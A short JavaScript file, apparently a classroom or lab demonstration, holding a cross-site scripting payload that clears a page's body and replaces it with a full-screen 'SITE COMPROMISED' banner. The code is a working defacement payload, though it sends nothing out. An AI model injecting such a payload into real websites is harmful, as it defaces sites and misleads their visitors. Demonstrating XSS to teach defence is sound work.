// Demo XSS payload for a vulnerable page.
// This does not affect the real project files; it only demonstrates how an unprotected site could be harmed.

(function () {
  const body = document.body;
  if (!body) return;

  body.innerHTML = '';
  const banner = document.createElement('div');
  banner.style.cssText = 'position:fixed;inset:0;background:#111;color:#fff;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;font-size:2rem;padding:2rem;text-align:center;z-index:999999;';
  banner.textContent = 'SITE COMPROMISED — XSS payload executed';
  body.appendChild(banner);

  setTimeout(() => {
    const note = document.createElement('p');
    note.style.cssText = 'position:fixed;bottom:20px;left:20px;color:#ff6b6b;font-size:1rem;';
    note.textContent = 'Reload the page to restore the UI.';
    body.appendChild(note);
  }, 500);
})();
